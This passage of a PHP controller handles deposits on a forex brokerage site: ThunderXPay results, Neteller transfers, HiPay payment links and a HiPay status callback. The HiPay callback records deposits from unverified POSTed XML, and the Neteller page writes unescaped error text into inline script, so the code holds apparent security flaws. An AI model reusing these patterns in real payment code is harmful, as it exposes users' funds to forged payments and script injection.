                                     }else{
                                         
                                              $this->session->set_flashdata('thundexpay_deposit', ' Transaction code is :'.$transaction_code);   
                                              redirect(base_url('deposit/thunderXPay?status=success'));    
                                                                   
                                         
                                     }      

                               /*======================================================*/
                            


                           }else{
                               
                             //  echo " This transection information does not found in this table thunder_xpay_deposit using this code";exit;
                               
                                    $sub_data=array(
                                           'message'=>"This transection information does not found in this table thunder_xpay_deposit using this code: ".$transaction_code,
                                           'details'=>$thunder_serialize_data,
                                           'text'=>'APyment method approve transection'
                                       )  ;

                                       $previouse_store_data_not_found=array(    
                                           'api_data'=>json_encode($sub_data),
                                           'status'=>2
                                       ) ;       


                                       $this->general_model->updatemy('thunder_xpay_deposit','transaction_code',$transaction_code,$previouse_store_data_not_found);
                            
                                       
                         $this->session->set_flashdata('thundexpay_deposit', 'Internal API error Please communicate Forexmart Support team. <br> Transaction code is :'.$transaction_code);   
                         redirect(base_url('deposit/thunderXPay?status=failed'));   
   
                                       
                           }




               }else{

                //echo "api reject";exit;

                           $sub_data=array(
                               'message'=>$transaction_message,
                               'details'=>$thunder_serialize_data,
                               'text'=>'Payment method Reject this transection'

                           )  ;

                           $failed_deposit_to_paymentGateWay=array(    
                               'api_data'=>json_encode($sub_data),
                               'status'=>2
                           ) ;       


                           $update_data_confirm=$this->general_model->updatemy('thunder_xpay_deposit','transaction_code',$transaction_code,$failed_deposit_to_paymentGateWay);


                           if($update_data_confirm){

                                $email_details = [
                                       'account_number' => $thunder_store_data->account_number,
                                       'type' => 'THUNDERXPAY',
                                       'reason' =>$transaction_message,
                                       'transaction_id' => 'transaction_id: '.$transaction_code.' status: failed',
                                   ];
                                   $this->sendEmailFailedDeposit($email_details); 
                           }

                         $this->session->set_flashdata('thundexpay_deposit', 'ThunderXPay declined this deposit! Please Try again.');   
                         redirect(base_url('deposit/thunderXPay?status=failed'));   


               }



    }else{
       // echo "api does not provides";exit;
        
         $asset_user_docs=$this->config->item('asset_user_docs');
         $message="Payment method does not provide any data . date: ".date('Y-m-d H:i:s', strtotime(FXPP::getCurrentDateTime()));         
         file_put_contents($asset_user_docs.'thunderxpay.log', $message.PHP_EOL, FILE_APPEND);
        
         
         
         
         
//                 $sub_data=array(
//                               'message'=>"ThunderXPay declined this deposit!",
//                               'details'=>"This transection does not complete and there are no data",
//                               'text'=>'Payment method does not provide any transection data'
//
//                           )  ;
//
//                           $failed_deposit_to_paymentGateWay=array(    
//                               'api_data'=>json_encode($sub_data),
//                               'status'=>2
//                           ) ;       
//
//
//                           $this->general_model->updatemy('thunder_xpay_deposit','transaction_code',$transaction_code,$failed_deposit_to_paymentGateWay);
//
//         
         
         
         
                 $data_insert=array(
                        'transection_method'=>'thundexpay',
                        'data_serialize'=>$thunder_serialize_data,
                        'created_date'=>date('Y-m-d H:i:s')
                     );
                 $this->general_model->insert('deposit_failed_logs',$data_insert);
                            
         $this->session->set_flashdata('thundexpay_deposit', 'ThunderXPay declined this deposit! Please Try again.');
         
          redirect(base_url('deposit/thunderXPay?status=failed'));
    }
                            



    
}

                            
     public function master_cards()
    {
        if ($this->session->userdata('logged')) {

            
            if(!IPLoc::Office()){
                
                echo "Not authorized";exit;
            }
            
            
            $card_type=$this->input->get('card');
            
            if($card_type=="card-documents"){
                $this->card_documents();
            }else if($card_type=="zotapay"){
                $this->zotapay();
            }else{
                $this->nova2pay();
            }
            
            
            
//            $master_cards_data=array(
//                'selected_providers'=>'nova2pay'
//            );
//            
//                $userId = $this->session->userdata('user_id');
//                $currency =  $this->input->post('currency', true);
//                            
//                $data['disabled'] = !$data['error_msg'] ? '' : 'disabled';
//
//                $account = $this->account_model->getAccountNumber($this->session->userdata('user_id'));
//                $data['account'] = $account;
//                $data['input_account_number'] = FXPP::inputAccountNumberWithBalance2($account['account_number'], $account['currency']);
//
//
//                            
//            $data['selected_providers']="nova2pay";
//            
//            $view = 'deposits/master_cards';
//            
//            $this->template->title('ForexMart | Deposit -Master Cards')
//                ->set_layout('internal/main')
//                ->append_metadata_css("<link rel='stylesheet' href='".$this->template->Css()."loaders.css'>")
//                ->append_metadata_js("<script src='".$this->template->Js()."custom-deposit.js'></script>")
//                ->build($view, $data);
            
            
            
            
            
            
        } else {
            redirect('signout');
        }
    }
    
    public function is_currency($amount)
    {
        $advance = "/\b\d{1,3}(?:,?\d{3})*(?:\.\d{2})?\b/";
        $simple = "/^\d+(\.\d{1,2})?$/";

        $validAmount = preg_match($simple, $amount);
        if ($validAmount) {
            return true;
        } else {
            $this->form_validation->set_message('is_currency', 'Invalid amount format');

            return false;
        }
    }

    public function is_minamount($amount)
    {
        if (strpos($amount, '.') !== false) {
            $amt = str_replace('.', '', (string) $amount);
        } else {
            $amt = $amount.'00';
        }
        $validAmount = 200;
        if ((int) $amt >= (int) $validAmount) {
            return true;
        } else {
            $this->form_validation->set_message('is_minamount', 'Minimum amount is 2.00 USD/GBP/RUB/EUR.');

            return false;
        }
    }

    public function neteller_v1()
    {
        redirect('deposit/neteller');
        if ($this->session->userdata('logged')) {
            //  if(FXPP::isEUClient()){redirect('deposit');}
            // FXPP::LoginTypeRestriction();
            $userAccountCurrencyBase = FXPP::getCustomUserAccountCurrencyBase();
            $data['option'] = $this->general_model->selectOptionList($userAccountCurrencyBase);

            if ($this->session->userdata('login_type') == 1) {
                $getCur = $this->partners_model->getAccountByUserId($this->session->userdata('user_id'));
                $currency_conv = $getCur['currency'];
                $acc_number = $getCur['reference_num'];
            } else {
                $getCur = $this->account_model->getAccountByUserId($this->session->userdata('user_id'));
                $currency_conv = $getCur['mt_currency_base'];
                $acc_number = $getCur['account_number'];
            }

            // if ($data['amount'] == null) {
            // $this->form_validation->set_rules('amount', 'Deposit Amount', 'trim|required|callback_is_minamount|xss_clean');
            $this->form_validation->set_rules('amount', 'Amount', "trim|required|deposit_min_amount2[$currency_conv]");
            $this->form_validation->set_rules('account_number', 'Currency', 'trim|required|xss_clean');
            $this->form_validation->set_rules('neteller_account', 'Account Email', 'trim|required|xss_clean');
            $this->form_validation->set_rules('neteller_secure_id', 'Secure Id', 'trim|required|xss_clean');
            //  }

            $error = '';
            $message = '';
            $field = '';
            $showModalOnLoad = false;
            $details = '';
            $showForm = 'nt-tab1';

            //Validation for NDB accounts with Bonus Profit
//            $ndb_status = $this->withdraw_model->hasCancelledNDBbonus($this->session->userdata('user_id'));
//            $hasInNdbBonus = $this->NodepositBonusValidation($this->session->userdata('user_id'));
//            if ($hasInNdbBonus == 2) { //has Ndb Bonus
//                $data['CurPendValidation'] = $this->CurrentAndPendingTradesValidation();//returns false if no open trades
//            }

            // Validation[ Valid account, complete employment details, is supporters accounts] return false or error message
            $data['error_msg'] = $this->updated_deposit_validation($this->session->userdata('user_id'));

            if ($this->form_validation->run() && !$data['error_msg']) {
                //if (!$data['CurPendValidation']['TradeError'] || $ndb_status) { //FXPP-5960
                //  $account_number = $this->input->post('account_number',true);

                $getTokenDetails = FXPP::Neteller_token();
                $netellerToken = $getTokenDetails['accessToken'];

                // $getAccountNumberDetails = $this->account_model->getAccountNumberDetails($account_number);
                if ($this->session->userdata('login_type') == 1) {
                    $getAccountNumberDetails = $this->account_model->getAccountByPartnerId2($this->session->userdata('user_id'));
                } else {
                    $getAccountNumberDetails = $this->account_model->getAccountByUserId($this->session->userdata('user_id'));
                }

                $account_number = $getAccountNumberDetails['account_number'];
                $currency = $getAccountNumberDetails['mt_currency_base'];
                $amount = $this->input->post('amount', true);

                $amt = round($amount, 2) * 100;

                $depositBonusField = [
                        'twpb' => 'twentypercentbonus',
                        'tpb' => 'thirtypercentbonus',
                        'fpb' => 'fiftypercentbonus',
                        'hplb' => 'hundredpercentbonus',
                        'rhpb' => 'regularhundredpercentbonus',
                        'fplb' => 'fiftypercentlimitedbonus',
                        'tenpb' => 'tenpercentbonus',
                    ];

                $tranDetails = [
                        'neteller_account' => $this->input->post('neteller_account', true),
                        'secure_id' => $this->input->post('neteller_secure_id', true),
                        'amount' => $amt,
                        'token' => $netellerToken,
                        'currency' => $currency,
                    ];

                $processNeteller = FXPP::Neteller_transferIn($tranDetails);
                // insert logs neteller

                $processNeteller_res = json_encode($processNeteller);
                $insNetDataArray = [
                        'Response' => $processNeteller_res,
                        'user_id' => $this->session->userdata('user_id'),
                    ];
                $this->deposit_model->response_neteller($insNetDataArray);

                if (empty($processNeteller['error'])) {
                    if (!empty($processNeteller['transaction']['id'])) {
                        $isMicro = $this->account_model->isMicro($this->session->userdata('user_id'));
                        if ($isMicro) {
                            $currencyStatus = $this->currency_status['Cents'];
                            $processed_amount = $processNeteller['transaction']['amount'];
                        } else {
                            $currencyStatus = $this->currency_status[$processNeteller['transaction']['currency']];
                            $processed_amount = $processNeteller['transaction']['amount'] / 100;
                        }

                        $conv_amount = $this->get_convert_amount($processNeteller['transaction']['currency'], $processed_amount);
                        $fees = $processNeteller['transaction']['fees'];
                        $fee_amount = 0;

                        foreach ($fees as $key => $fee) {
                            if ($fee['feeType'] == 'service_fee') {
                                if ($isMicro) {
                                    $fee_amount += $fee['feeAmount'];
                                } else {
                                    $fee_amount += ($fee['feeAmount'] / 100);
                                }
                            }
                        }

                        $insertDepositFailed = [
                                'transaction_id	' => $processNeteller['transaction']['id'],
                                'status	' => 0,
                                'amount	' => $processed_amount,
                                'currency' => $processNeteller['transaction']['currency'],
                                'user_id' => $this->session->userdata('user_id'),
                                'payment_date' => $processNeteller['transaction']['createDate'],
                                'transaction_type' => 'NETELLER',
                                'payment_status	' => $this->paymentType_status['Deposit via Neteller'],
                                'currency_status' => $currencyStatus,
                                'fee' => $fee_amount,
                                'isFailed' => 0,
                                'type' => 'deposit-'.$isMicro.'-'.$_GET['bonus'],
                            ];

                        //auto tag bonus upon deposit to account for delay issue.
                        if (isset($_GET['bonus']) && !empty($_GET['bonus'])) {
                            $isTag = 1;
                            $bonus_type = $_GET['bonus'];
                        } else {
                            $bonus_type = 'tpb';
                            $isTag = 0;
                        }

                        $gross_amount = $processed_amount - $fee_amount;
                        $conv_amount_fee = $this->get_convert_amount($processNeteller['transaction']['currency'], $fee_amount);
                        $conv_amount -= $conv_amount_fee;

                        $insertDepositFeeTransaction = [
                                'transaction_id' => $processNeteller['transaction']['id'],
                                'reference_id' => $processNeteller['transaction']['merchantRefId'],
                                'status' => 2,
                                'amount' => $fee_amount,
                                'currency' => $processNeteller['transaction']['currency'],
                                'user_id' => $this->session->userdata('user_id'),
                                'payment_date' => $processNeteller['transaction']['createDate'],
                                'transaction_type' => 'NETELLER',
                                'conv_amount' => $conv_amount_fee,
                                $depositBonusField[$bonus_type] => $isTag,
                                'payment_status' => $this->paymentType_status['Deposit via Neteller'], //FXPP-7618
                                'currency_status' => $currencyStatus, //FXPP-7618
                            ];

                        $insertDepositTransaction = [
                                'transaction_id' => $processNeteller['transaction']['id'],
                                'reference_id' => $processNeteller['transaction']['merchantRefId'],
                                'status' => 2,
                                'amount' => $gross_amount,
                                'currency' => $processNeteller['transaction']['currency'],
                                'user_id' => $this->session->userdata('user_id'),
                                'payment_date' => $processNeteller['transaction']['createDate'],
                                'transaction_type' => 'NETELLER',
                                'conv_amount' => $conv_amount,
                                $depositBonusField[$bonus_type] => $isTag,
                                'payment_status' => $this->paymentType_status['Deposit via Neteller'], //FXPP-7618
                                'currency_status' => $currencyStatus, //FXPP-7618
                            ];

                        $showModalOnLoad = true;

                        $config = [
                                'server' => 'live_new',
                            ];

                        //Fee Amount
                        if ($fee_amount > 0) {
//                            $WebService = new WebService($config);

//                            if (IPLoc::APIUpgradeDevIP()) {
                                $WebServiceNew = FXPP::DepositRealFund($account_number, $fee_amount, $this->comment_type['deposit_fee'].$this->comment_transaction_type['NETELLER'].$insertDepositTransaction['transaction_id']);
                                $requestResult = $WebServiceNew['requestResult'];
                                $ticket = $WebServiceNew['ticket'];
//                            } else {
//                                $WebService->update_live_deposit_balance($account_number, $fee_amount, $this->comment_type['deposit_fee'].$this->comment_transaction_type['NETELLER'].$insertDepositTransaction['transaction_id']);
//                                $requestResult = $WebService->request_status;
//                                $ticket = $WebService->get_result('Ticket');
//                            }

                            if ($requestResult === 'RET_OK') {
                                $insertDepositFeeTransaction['mt_ticket'] = $ticket;

                                //insert Fee in DB
                                $netellerInsertDepositfee = $this->deposit_model->insertPayment($insertDepositFeeTransaction);

                                // log for failed inserting of fee payment
                                if (!$netellerInsertDepositfee) {
                                    $insertDepositFailed['comment'] = 'Inserting Deposit Fee Details Failed ';
                                    $this->general_model->insert('no_status_transaction', $insertDepositFailed);
                                }

                                $WebService2 = new WebService($config);
                                $WebService2->request_live_account_balance($account_number);

                                if ($WebService2->request_status === 'RET_OK') {
                                    $balance = $WebService2->get_result('Balance');
                                    if ($this->session->userdata('login_type') == 1) {
                                        $this->account_model->updatePartnerAccountBalance($account_number, $balance);
                                    } else {
                                        $this->account_model->updateAccountBalance($account_number, $balance);
                                    }
                                    //FXPP::extraCommission($account_number,$amount,$insertDepositTransaction['transaction_id']);  // Exatra commission update
                                }
                            } else {
                                $insertDepositFailed['comment'] = $requestResult;
                                $this->general_model->insert('no_status_transaction', $insertDepositFailed);
                            }
                        } else {
                            $insertDepositFailed['comment'] = 'Fee is less than 1';
                            $this->general_model->insert('no_status_transaction', $insertDepositFailed);
                        }

                        //deposit Amount
//                        $WebService = new WebService($config);

//                        if (IPLoc::APIUpgradeDevIP()) {
                            $WebServiceNew = FXPP::DepositRealFund($account_number, $gross_amount, $this->comment_type['deposit'].$this->comment_transaction_type['NETELLER'].$insertDepositTransaction['transaction_id']);
                            $requestResult = $WebServiceNew['requestResult'];
                            $ticket = $WebServiceNew['ticket'];
//                        } else {
//                            $WebService->update_live_deposit_balance($account_number, $gross_amount, $this->comment_type['deposit'].$this->comment_transaction_type['NETELLER'].$insertDepositTransaction['transaction_id']);
//                            $requestResult = $WebService->request_status;
//                            $ticket = $WebService->get_result('Ticket');
//                        }

                        if ($requestResult === 'RET_OK') {
                            $insertDepositTransaction['mt_ticket'] = $ticket;

                            //insert Deposit AMount in DB
                            $netellerInsertDeposit = $this->deposit_model->insertPayment($insertDepositTransaction);

                            if (!$netellerInsertDeposit) {
                                $insertDepositFailed['comment'] = 'Inserting Deposit Details Failed ';
                                $this->general_model->insert('no_status_transaction', $insertDepositFailed);
                            }

                            $conv_processed_amount_usd = $this->get_convert_amount($processNeteller['transaction']['currency'], $processed_amount);
                            $transaction_comment = $this->comment_type['deposit'].$this->comment_transaction_type['NETELLER'].$insertDepositTransaction['transaction_id'];

                            /**  Use original amount for Cent accounts**/
                            $isMicro = $this->account_model->isMicro($insertDepositTransaction['user_id']);
                            if ($isMicro) {
                                $conv_processed_amount_usd = floatval($conv_processed_amount_usd / 100);
                            }
                            /* End **/

                            /* Send successful email deposit to auto-reports **/
                            $this->sendEmailAfterSuccessDeposit('Neteller', $conv_processed_amount_usd, $account_number, $insertDepositTransaction['user_id'], $transaction_comment);
                            /* End **/

                            // Back Agent of Client
                            //FXPP::BackAgentOfAccount($account_number);

                            $WebService2 = new WebService($config);
                            $WebService2->request_live_account_balance($account_number);
                            if ($WebService2->request_status === 'RET_OK') {
                                $test_array = ['log_date' => date('Y-m-d H:i:s', strtotime('now')), 'log_value' => 'Deposit Update Balance API', 'data' => '', 'ip' => $this->input->ip_address()];
                                $this->general_model->insertmy('neteller_test_data', $test_array);

                                $balance = $WebService2->get_result('Balance');
                                if ($this->session->userdata('login_type') == 1) {
                                    $this->account_model->updatePartnerAccountBalance($account_number, $balance);
                                } else {
                                    $this->account_model->updateAccountBalance($account_number, $balance);
                                }
                                //FXPP::extraCommission($account_number,$amount,$insertDepositTransaction['transaction_id']);  // Exatra commission update
                            } else {
                                $insertDepositFailed['comment'] = $WebService2->request_status;
                                $this->general_model->insert('no_status_transaction', $insertDepositFailed);
                            }
                        } else {
                            $insertDepositFailed['comment'] = $requestResult;
                            $this->general_model->insert('no_status_transaction', $insertDepositFailed);
                        }

                        $this->SetAccountAgentPotentialFund($account_number);

                        $user_id = $this->session->userdata('user_id');
                        $RequestLogintype = $this->account_model->getAccountLoginType($user_id);

//                            FXPP::updateAccountTradingStatus($account_number,$user_id); // for pro accounts

                        /*  if(IPLoc::APIUpgradeDevIP()){
                              FXPP::updateAccountTradingStatusV2($account_number,$user_id); // for pro accounts
                          }else{*/
                        FXPP::updateAccountTradingStatus($account_number, $user_id); // for pro accounts
                        //}

                        // Bonus Crediting
                        if (isset($_GET['bonus']) && !empty($_GET['bonus'])) {
//                            if ($_GET['bonus'] === 'hpb') {
//                                // 100% bonus
//                                FXPP::Deposit100PercentBonus($user_id, $account_number, $processed_amount, 'neteller', 'hplb', $insertDepositTransaction['transaction_id']);
//                            } elseif ($_GET['bonus'] === 'rhpb') {
//                                FXPP::DepositRegular100PercentBonus($user_id, $account_number, $processed_amount, 'neteller', 'rhpb', $insertDepositTransaction['transaction_id']);
//                            } else {
//                                FXPP::DepositBonus($user_id, $account_number, $processed_amount, 'neteller', $_GET['bonus'], $insertDepositTransaction['transaction_id']);
//                            }
                            self::applyDepositBonus($user_id, $account_number, $processed_amount, 'neteller', $_GET['bonus'], $insertDepositTransaction['transaction_id'], false);
                        }

                        // NDB Bonus Cancellation
                        $bonuses = FXPP::getAccountBonusByType($account_number);
                        if ($RequestLogintype['login_type'] != 1) {
                            if ($processed_amount > 0 and $bonuses[2] > 0) {
                                FXPP::BonusProfitCancellation($user_id, $account_number, $processed_amount, $insertDepositTransaction['transaction_id']);
                            }
                        }

                        // Bonus Profit Logs**/
                        $ndbProfitLogs = [
                                'Account_number' => $account_number,
                                'DepAmount' => $processed_amount,
                                'UserId' => $user_id,
                                'TransactionId' => $insertDepositTransaction['transaction_id'],
                                'ndbbonus' => $bonuses[2],
                            ];
                        $encodeNdbProfitLogs = json_encode($ndbProfitLogs);
                        $insertProfitLogs = [
                                'logs' => $encodeNdbProfitLogs,
                                'User_Id' => $user_id,
                            ];

                        $this->deposit_model->insertNdbCancellationLogs($insertProfitLogs);

                        $details = [
                                'amount' => $processed_amount,
                                'account_number' => $account_number,
                                'neteller_account' => $this->input->post('neteller_account', true),
                                'reference_number' => $processNeteller['transaction']['merchantRefId'],
                            ];

                        $showForm = 'nt-tab3';
                        $showForm1 = 'nt-tab';

                        if ($processNeteller['transaction']['status'] == 'declined' || $processNeteller['transaction']['status'] == 'cancelled' || $processNeteller['transaction']['status'] == 'failed') {
                            $account_detail = $this->account_model->getAccountByUserId($this->session->userdata('user_id'));
                            $data = [
                                    'account_number' => $account_detail['account_number'],
                                    'type' => 'Neteller',
                                    'reason' => $processNeteller['transaction']['status'],
                                ];
                            $this->sendEmailFailedDeposit($data);
                        }
                    } else {
                        $field = 'neteller_account';
                        $message = 'Something went wrong. Please try again.';

                        if ($this->session->userdata('login_type') == 1) {
                            $account_detail = $this->partners_model->getAccountByUserId($this->session->userdata('user_id'));
                            $accountNumber = $account_detail['reference_num'];
                        } else {
                            $account_detail = $this->account_model->getAccountByUserId($this->session->userdata('user_id'));
                            $accountNumber = $account_detail['account_number'];
                        }
                        $data = [
                                'account_number' => $accountNumber,
                                'type' => 'Neteller',
                                'reason' => $processNeteller['error']['message'],
                            ];
                        $this->sendEmailFailedDeposit($data);
                    }
                } else {
                    $codeError = $processNeteller['error']['code'];

                    switch ($codeError) {
                            case '5279':
                                $field = 'neteller_account';
                                $message = $processNeteller['error']['message'];
                                break;
                            case '5270':
                                $field = 'neteller_account';
                                $message = $processNeteller['error']['message'];
                                break;
                            case '20001':
                                $field = 'neteller_account';
                                $message = $processNeteller['error']['message'];
                                break;
                            case '20002':
                                $field = 'neteller_account';
                                $message = $processNeteller['error']['message'];
                                break;
                            case '20003':
                                $field = 'amount';
                                $message = $processNeteller['error']['message'];
                                break;
                            case '20005':
                                $field = 'neteller_account';
                                $message = $processNeteller['error']['message'];
                                break;
                            case '20006':
                                $field = 'amount';
                                $message = $processNeteller['error']['message'];
                                break;
                            case '20007':
                                $field = 'neteller_account';
                                $message = $processNeteller['error']['message'];
                                break;
                            case '20008':
                                $field = 'verificationCode';
                                $message = $processNeteller['error']['message'];
                                break;
                            case '20010':
                                $field = 'neteller_account';
                                $message = $processNeteller['error']['message'];
                                break;
                            case '20020':
                                $field = 'verificationCode';
                                $message = $processNeteller['error']['message'];
                                break;
                            case '20021':
                                $field = 'amount';
                                $message = $processNeteller['error']['message'];
                                break;
                            case '20022':
                                $field = 'amount';
                                $message = $processNeteller['error']['message'];
                                break;
                            case '20026':
                                $field = 'amount';
                                $message = $processNeteller['error']['message'];
                                break;
                            case '20030':
                                $field = 'amount';
                                $message = $processNeteller['error']['message'];
                                break;
                            case '20031':
                                $field = 'amount';
                                $message = $processNeteller['error']['message'];
                                break;
                            case '20035':
                                $field = 'amount';
                                $message = $processNeteller['error']['message'];
                                break;
                            case '20040':
                                $field = 'neteller_account';
                                $message = $processNeteller['error']['message'];
                                break;
                            case '20045':
                                $field = 'neteller_account';
                                $message = $processNeteller['error']['message'];
                                break;
                            case '20200':
                                $field = 'neteller_account';
                                $message = $processNeteller['error']['message'];
                                break;
                            case '20301':
                                $field = 'neteller_account';
                                $message = $processNeteller['error']['message'];
                                break;
                            case '20999':
                                $field = 'neteller_account';
                                $message = $processNeteller['error']['message'];
                                break;
                            case '5001':
                                $field = 'amount';
                                $message = $processNeteller['error']['message'];
                                break;
                            default:
                                $message = $processNeteller['error']['fieldErrors'][0]['error'];
                                $field = $processNeteller['error']['fieldErrors'][0]['field'];
                        }

                    if ($this->session->userdata('login_type') == 1) {
                        $account_detail = $this->partners_model->getAccountByUserId($this->session->userdata('user_id'));
                        $accountNumber = $account_detail['reference_num'];
                    } else {
                        $account_detail = $this->account_model->getAccountByUserId($this->session->userdata('user_id'));
                        $accountNumber = $account_detail['account_number'];
                    }
                    $data = [
                            'account_number' => $accountNumber,
                            'type' => 'Neteller',
                            'reason' => $processNeteller['error']['message'],
                        ];
                    $this->sendEmailFailedDeposit($data);
                }
                // }
            }

            if ($this->session->userdata('login_type') == 1) {
                $user_status = $this->partners_model->getAccountStatus($this->session->userdata('user_id'));
            } else {
                $user_status = $this->account_model->getAccountStatus($this->session->userdata('user_id'));
            }
            $data['incomplete'] = $this->account_model->incompleteRegistration($this->session->userdata('user_id'));

            //  $data['user_status'] = $user_status;
            $data['non_verified_notice'] = (!$user_status) ? $this->non_verified_notice() : false;
            $data['disabled'] = !$data['error_msg'] ? '' : 'disabled';

            $data['metadata_description'] = 'Provide the necessary information to deposit via Neteller. Request is processed within 24 hours.';

            if ($this->session->userdata('login_type') == 1) {
                $account = $this->partners_model->getAccountByUserId($this->session->userdata('user_id'));
            } else {
                $account = $this->account_model->getAccountByUserId($this->session->userdata('user_id'));
            }

            $data['account'] = $account;
            if ($this->session->userdata('login_type') == 1) {
                $account['mt_currency_base'] = $account['currency'];

                $data['account']['mt_currency_base'] = $account['currency'];
                $data['account']['account_number'] = $account['reference_num'];
            }
            $data['account']['currency'] = $this->general_model->getAccountCurrencyBase($account['mt_currency_base']);
            $data['account']['currency_new'] = $data['account']['currency'];
            if ($data['account']['currency_new'] == 'RUB') {
                $data['account']['currency_new'] = 'RUR';
            }

            $isMicro = $this->account_model->isMicro($this->session->userdata('user_id'));
            if ($isMicro) {
                $data['micro'] = 1;
            }

            $AcceptRiskDoc = $this->account_model->getRegistrationIP($this->session->userdata('user_id'));
            $data['RegCountry'] = IPLoc::getCountryCodeFromIP($AcceptRiskDoc);

            $js = $this->template->Js();
            $addjs = '<script>'.
                "var error = '$error',".
                "message = '$message',".
                "field = '$field',".
                'details = '.json_encode($details).','.
                "showModal = '$showModalOnLoad';".
                "var showForm = '$showForm';".
                "var showForm1 = '$showForm1';".
                '</script>'.
                "<script src='".$js."custom-neteller.js'></script>".
                "<script src='".$js."custom-deposit.js'></script>";
            $this->template->title('ForexMart | Deposit - Neteller')
                ->set_layout('internal/main')
                ->prepend_metadata($addjs)
                ->build('deposits/neteller', $data);
        } else {
            redirect('signout');
        }
    }

    public function hipay()
    {
        if ($this->session->userdata('logged')) {
            FXPP::LoginTypeRestriction();

            $this->form_validation->set_rules('currency', 'Currency', 'trim|required|xss_clean');
            $this->form_validation->set_rules('amount', 'Amount', 'trim|required|xss_clean');

            // Validation[ Valid account, complete employment details, is supporters accounts] return false or error message
            $data['error_msg'] = $this->deposit_validation($this->session->userdata('user_id'));
            if ($this->form_validation->run() && !$data['error_msg']) {
                // Live platform: link => https://payment.hipay.com/index/link, id => '569E11C723CC8'
                // Test platform: link => https://test-payment.hipay.com/index/link, id => '569F04E05968F'
                $data = [
                    'link' => 'https://payment.hipay.com/index/link',
                    'amount' => $this->input->post('amount', true),
                    'id' => '569E11C723CC8',
                ];
                $this->load->view('deposits/hipay_payments', $data);
            } else {
                $user_status = $this->account_model->getAccountStatus($this->session->userdata('user_id'));
                $data['incomplete'] = $this->account_model->incompleteRegistration($this->session->userdata('user_id'));
                // $data['user_status'] = $user_status;

                if ($user_status) {
                    if ($data['incomplete']) {
                        $disabled = '';
                    } else {
                        $disabled = 'disabled';
                    }
                } else {
                    $disabled = 'disabled';
                }

                $data['disabled'] = $disabled;

                $data['option'] = $this->general_model->selectOptionList(FXPP::getUserAccountCurrencyBase());

                $status = $this->input->get('status');
                $data['status'] = $status;
                if ($status === 'success') {
                    $data['success'] = true;
                } else {
                    $data['success'] = false;
                }

                $account = $this->account_model->getAccountByUserId($this->session->userdata('user_id'));

                $data['account'] = $account;
                $data['account']['currency'] = $this->general_model->getAccountCurrencyBase($account['mt_currency_base']);
                $data['metadata_description'] = 'Provide the necessary information to deposit via HiPay Wallet. Request is processed within 24 hours.';

                if ($this->session->userdata('user_id') == 54179) {
                    $stat = $this->session->flashdata('d_hp_status');
                    if (isset($stat)) {
                        $account_detail = $this->account_model->getAccountByUserId($this->session->userdata('user_id'));
                        $email_details = [
                            'account_number' => $account_detail['account_number'],
                            'type' => 'Hipay',
                            'reason' => $stat,
                        ];
                        $this->sendEmailFailedDeposit($email_details);
                    }
                }

                $this->template->title('ForexMart | Deposit - HiPay Wallet')
                    ->set_layout('internal/main')
                    ->prepend_metadata("
                        <script src='".$this->template->Js()."custom-deposit.js'></script>
                                ")
                    ->build('deposits/hipay', $data);
            }
        } else {
            redirect('signout');
        }
    }

    public function hipaystatus()
    {
        $response = simplexml_load_string($_POST['xml'], 'SimpleXMLElement', LIBXML_NOCDATA);
        $result = json_decode(json_encode((array) $response), true);

        if ($result['result']['operation'] == 'capture') { // Notification of the real capture to debit the customer's account
            if ($result['result']['status'] == 'ok') {
                $date = new DateTime();
                $order_number = $date->getTimestamp();
                $amount = $result['result']['origAmount'];
                $currency = $result['result']['origCurrency'];
                $conv_amount = $this->get_convert_amount($currency, $amount);
                $data = [
                    'transaction_id' => $result['result']['transid'],
                    'reference_id' => $order_number,
                    'status' => $this->hipay_status[$result['result']['status']],
                    'amount' => $result['result']['origAmount'],
                    'currency' => $result['result']['origCurrency'],
                    'payment_date' => date('Y-m-d H:i:s', strtotime($result['result']['date'].' '.$result['result']['time'])),
                    'note' => 'TEST DEPOSIT',
                    'transaction_type' => 'HIPAY',
                    'user_id' => 54179,
                    'conv_amount' => $conv_amount,
                ];

                $this->deposit_model->insertPayment($data);
                $insertData = ['transid' => $data['transaction_id']];
                $this->general_model->updatemy('hipay', 'id', 1, $insertData);
            } else {
                //if ($user_id['user_id'] == 54179) {
                $account_detail = $this->account_model->getAccountByUserId(54179);
                $status_msg = [
                    'nok' => 'Operation not succeeded',
                    'cancel' => 'Cancelation of the operation',
                    'waiting' => 'Operation waiting for an action',
                ];
                $email_details = [
                    'account_number' => $account_detail['account_number'],
                    'type' => 'Hipay',
                    'reason' => strtoupper($status_msg[$result['result']['status']]),
                ];
                $this->sendEmailFailedDeposit($email_details);
                //}
            }
        } elseif ($result['result']['operation'] == 'cancellation' || $result['result']['operation'] == 'refunded' || $result['result']['operation'] == 'reject') {
            //if ($user_id['user_id'] == 54179) {
            $account_detail = $this->account_model->getAccountByUserId(54179);
            $email_details = [
                'account_number' => $account_detail['account_number'],
                'type' => 'Hipay',
                'reason' => strtoupper($result['result']['operation']),
            ];
            $this->sendEmailFailedDeposit($email_details);
            //}
        }
    }

    public function redirecthipay()
    {
        sleep(5);
        $getTransId = $this->general_model->show('hipay', 'transid', '', '*', '')->result_array();
        $transId = $getTransId[0]['transid'];
        $result = $this->general_model->showssingle('deposit', 'transaction_id', $transId, '*');
        $data = [];
        if ($result['user_id'] == 54179) {
            $user_id = ['user_id' => $this->session->userdata('user_id')];
            $res = $this->general_model->updatemy('deposit', 'transaction_id', $transId, $user_id);

            if (!$res) {
                sleep(5);
                $this->general_model->updatemy('deposit', 'transaction_id', $transId, $user_id);
            }

            $config = [
                'server' => 'live_new',
            ];

            $account = $this->account_model->getAccountByUserId($user_id['user_id']);
            $account_number = $account['account_number'];

//            $WebService = new WebService($config);

//            if (IPLoc::APIUpgradeDevIP()) {
                $WebServiceNew = FXPP::DepositRealFund($account_number, $result['amount'], $this->comment_type['deposit'].$this->comment_transaction_type['HIPAY'].$getTransId);
                $requestResult = $WebServiceNew['requestResult'];
                $ticket = $WebServiceNew['ticket'];
//            } else {
//                $WebService->update_live_deposit_balance($account_number, $result['amount'], $this->comment_type['deposit'].$this->comment_transaction_type['HIPAY'].$getTransId);
//                $requestResult = $WebService->request_status;
//                $ticket = $WebService->get_result('Ticket');
//            }

            if ($requestResult === 'RET_OK') {
                $data['mt_ticket'] = $ticket;

                // Back Agent of Client
               // FXPP::BackAgentOfAccount($account_number);

                $WebService2 = new WebService($config);
                $WebService2->request_live_account_balance($account_number);
                if ($WebService2->request_status === 'RET_OK') {
                    $balance = $WebService2->get_result('Balance');
                    $this->account_model->updateAccountBalance($account_number, $balance);
                }
